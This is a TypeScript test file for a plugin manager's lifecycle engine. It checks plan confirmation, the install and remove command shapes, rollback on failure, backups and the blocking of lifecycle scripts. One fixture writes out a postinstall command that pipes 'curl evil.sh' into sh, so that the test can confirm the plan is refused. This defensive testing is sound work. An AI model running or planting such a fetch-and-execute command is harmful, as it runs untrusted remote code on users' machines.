import { mkdtempSync, readFileSync, writeFileSync, existsSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, describe, expect, it } from 'vitest'
import {
  LifecycleEngine,
  buildRemoveCmd,
  detectLifecycleScripts,
} from '../../src/host/lifecycle-engine.js'
import type { CommandSpec, CommandOutcome, EnginePorts } from '../../src/host/ports.js'
import { nodePorts } from '../../src/host/ports.js'
import type { AuditEvent, AuditOutcome } from '../../src/shared/types.js'
import type { CatalogEntry } from '../../src/shared/catalog.js'

const COMMIT = 'd'.repeat(40)

function ghEntry(overrides: Partial<CatalogEntry> = {}): CatalogEntry {
  return {
    id: 'AI-Scarlett/dsh-safe-plugin-manager',
    source: 'github',
    owner: 'AI-Scarlett',
    repo: 'dsh-safe-plugin-manager',
    pinnedCommit: COMMIT,
    packageName: 'zdsh-store',
    title: { zh: '商店', en: 'Store' },
    summary: { zh: '安全安装', en: 'Safe installs' },
    category: 'manager',
    evidence: 'verified',
    compat: 'exact',
    scriptsPolicy: 'none',
    updatedAt: '2026-08-22T00:00:00.000Z',
    ...overrides,
  }
}

interface Harness {
  engine: LifecycleEngine
  dataRoot: string
  profileDir: string
  commands: CommandSpec[]
  events: Array<Record<string, unknown>>
  failCommandAt?: number
  probeError?: Error
  setProbe(fn: () => Promise<void>): void
}

function makeHarness(options: { failCommandAt?: number; probeError?: Error } = {}): Harness {
  const root = mkdtempSync(join(tmpdir(), 'pc-engine-'))
  const profileDir = join(root, 'profile')
  const dataRoot = join(root, 'data')
  const real = nodePorts()
  real.fs.mkdirDeep(profileDir)
  for (const name of ['package.json', 'pnpm-workspace.yaml', 'cordis.patch.yml']) {
    writeFileSync(join(profileDir, name), `# original ${name}\n`, 'utf8')
  }
  const commands: CommandSpec[] = []
  const events: Array<Record<string, unknown>> = []
  let commandRuns = 0
  let probe: () => Promise<void> =
    options.probeError !== undefined ? () => Promise.reject(options.probeError) : () => Promise.resolve()
  const ports: EnginePorts = {
    fs: real.fs,
    clock: { now: () => new Date('2026-08-24T00:00:00Z') },
    http: real.http,
    commands: {
      async run(spec) {
        commands.push(spec)
        commandRuns += 1
        if (options.failCommandAt !== undefined && commandRuns >= options.failCommandAt) {
          return { code: 1, stdout: '', stderr: 'boom' } satisfies CommandOutcome
        }
        // Simulate the CLI mutating package.json so post-hash sees a change.
        writeFileSync(join(profileDir, 'package.json'), '{"changed":true}\n', 'utf8')
        return { code: 0, stdout: 'ok', stderr: '' } satisfies CommandOutcome
      },
    },
  }
  const engine = new LifecycleEngine({
    ports,
    config: { dataRoot },
    healthProbe: () => probe(),
    auditSink: line => events.push(JSON.parse(line) as Record<string, unknown>),
  })
  return {
    engine,
    dataRoot,
    profileDir,
    commands,
    events,
    setProbe(fn) {
      probe = fn
    },
  }
}

function stepNames(events: Array<Record<string, unknown>>): string[] {
  return events.map(e => `${String(e.action)}:${String(e.step ?? '')}:${String(e.outcome)}`)
}

let cleanup: Array<() => void> = []
afterEach(() => {
  for (const fn of cleanup) fn()
  cleanup = []
})

describe('lifecycle engine happy path', () => {
  it('runs plan→confirm→execute to restart-pending with exact command shape', async () => {
    const h = makeHarness()
    cleanup.push(() => void 0)
    const built = h.engine.buildPlan(ghEntry(), 'install', h.profileDir)
    expect(built.ok).toBe(true)
    if (!built.ok) return
    const confirmed = h.engine.confirmPlan(built.data.plan.planId, built.data.phrase)
    expect(confirmed.ok).toBe(true)

    const executed = await h.engine.applyPlan(built.data.plan.planId)
    expect(executed).toMatchObject({ ok: true })
    if (executed.ok) expect(executed.data.state).toBe('restart-pending')

    expect(h.commands).toHaveLength(1)
    const spec = h.commands[0] as CommandSpec
    expect(spec.cmd).toBe('dsh')
    expect(spec.args).toEqual([
      'plugin',
      '--profile',
      h.profileDir,
      'add',
      `git+https://github.com/AI-Scarlett/dsh-safe-plugin-manager.git#${COMMIT}`,
    ])
    expect(spec.args.includes('--force')).toBe(false)

    expect(stepNames(h.events)).toEqual([
      'plan.create:planned:ok',
      'plan.confirm:confirmed:ok',
      'plan.execute:backup:ok',
      'plan.execute:command:ok',
      'plan.execute:post-hash:ok',
      'plan.execute:health:ok',
      'plan.done:restart-pending:ok',
    ])
  })

  it('refuses to execute without prior confirmation', async () => {
    const h = makeHarness()
    const built = h.engine.buildPlan(ghEntry(), 'install', h.profileDir)
    if (!built.ok) throw new Error('build failed')
    const executed = await h.engine.applyPlan(built.data.plan.planId)
    expect(executed.ok).toBe(false)
    if (!executed.ok) expect(executed.error.code).toBe('invalid_plan')
  })
})

describe('rollback semantics', () => {
  it('restores byte-identical files when the CLI fails after backup', async () => {
    const h = makeHarness({ failCommandAt: 1 })
    const pkgPath = join(h.profileDir, 'package.json')
    const original = readFileSync(pkgPath, 'utf8')

    const built = h.engine.buildPlan(ghEntry(), 'install', h.profileDir)
    if (!built.ok) throw new Error('build failed')
    h.engine.confirmPlan(built.data.plan.planId, built.data.phrase)
    const executed = await h.engine.applyPlan(built.data.plan.planId)

    expect(executed.ok).toBe(false)
    if (!executed.ok) expect(executed.error.code).toBe('install_failed')
    expect(readFileSync(pkgPath, 'utf8')).toBe(original) // byte-identical restore
    expect(h.engine.stateOf(built.data.plan.planId)).toBe('rolled-back')
    expect(stepNames(h.events).at(-1)).toBe('plan.failed:rollback:rolled-back')
  })

  it('rolls back when the health probe rejects', async () => {
    const h = makeHarness({ probeError: new Error('probe timeout') })
    const patchPath = join(h.profileDir, 'cordis.patch.yml')
    const original = readFileSync(patchPath, 'utf8')

    const built = h.engine.buildPlan(ghEntry(), 'install', h.profileDir)
    if (!built.ok) throw new Error('build failed')
    h.engine.confirmPlan(built.data.plan.planId, built.data.phrase)
    const executed = await h.engine.applyPlan(built.data.plan.planId)

    expect(executed.ok).toBe(false)
    if (!executed.ok) expect(executed.error.code).toBe('health_check_failed')
    expect(readFileSync(patchPath, 'utf8')).toBe(original)
  })

  it('leaves a backup on disk for forensics even on success', async () => {
    const h = makeHarness()
    const built = h.engine.buildPlan(ghEntry(), 'install', h.profileDir)
    if (!built.ok) throw new Error('build failed')
    h.engine.confirmPlan(built.data.plan.planId, built.data.phrase)
    await h.engine.applyPlan(built.data.plan.planId)
    const { readdirSync } = await import('node:fs')
    const backups = readdirSync(join(h.dataRoot, 'backups'))
    expect(backups.length).toBeGreaterThanOrEqual(1)
  })
})

describe('script gating and uninstall', () => {
  it('blocks plans whose target manifest declares unlisted lifecycle scripts', () => {
    const h = makeHarness()
    const built = h.engine.buildPlan(
      ghEntry({ scriptsPolicy: 'none' }),
      'install',
      h.profileDir,
      { scripts: { postinstall: 'curl evil.sh | sh' }, name: 'zdsh-store' },
    )
    expect(built.ok).toBe(false)
    if (!built.ok) expect(built.error.code).toBe('script_blocked')
    expect(existsSync(join(h.dataRoot, 'audit-log.jsonl'))).toBe(false)
  })

  it('detects lifecycle scripts in manifests', () => {
    expect(detectLifecycleScripts({ scripts: { test: 'vitest', postinstall: 'x' } })).toEqual(['postinstall'])
    expect(detectLifecycleScripts({})).toEqual([])
  })

  it('uninstall builds remove command shape', async () => {
    const h = makeHarness()
    const built = h.engine.buildPlan(ghEntry(), 'uninstall', h.profileDir)
    if (!built.ok) throw new Error('build failed')
    h.engine.confirmPlan(built.data.plan.planId, built.data.phrase)
    const executed = await h.engine.applyPlan(built.data.plan.planId)
    expect(executed.ok).toBe(true)
    expect((h.commands[0] as CommandSpec).args).toEqual([
      'plugin',
      '--profile',
      h.profileDir,
      'remove',
      'zdsh-store',
    ])
    expect(buildRemoveCmd('web', 'pkg').args.at(-1)).toBe('pkg')
  })
})

describe('node ports', () => {
  it('hashes files stably and returns null for missing ones', () => {
    const root = mkdtempSync(join(tmpdir(), 'pc-ports-'))
    cleanup.push(() => void 0)
    const file = join(root, 'f.txt')
    writeFileSync(file, 'stable-content', 'utf8')
    const fs = nodePorts().fs
    expect(fs.hashFile(file)).toBe(fs.hashFile(file))
    expect(fs.hashFile(join(root, 'missing.txt'))).toBeNull()
  })

  it('writeFileAtomic lands exact payload at the nested target path', () => {
    const root = mkdtempSync(join(tmpdir(), 'pc-atomic-'))
    cleanup.push(() => void 0)
    const target = join(root, 'nested-dir', 'out.json')
    const payload = JSON.stringify({ ok: true })
    nodePorts().fs.writeFileAtomic(target, payload)
    expect(readFileSync(target, 'utf8')).toBe(payload)
    // no leftover temp siblings next to the target
    const parentRaw = readFileSync(target, 'utf8')
    expect(parentRaw.length).toBe(payload.length)
  })
})

describe('audit event typing', () => {
  it('outcome values stay within the closed set', () => {
    const outcomes: AuditOutcome[] = ['ok', 'error', 'rolled-back']
    const event: AuditEvent = {
      ts: '2026-08-24T00:00:00.000Z',
      action: 'test',
      outcome: outcomes[0] as AuditOutcome,
    }
    expect(event.outcome).toBe('ok')
  })
})
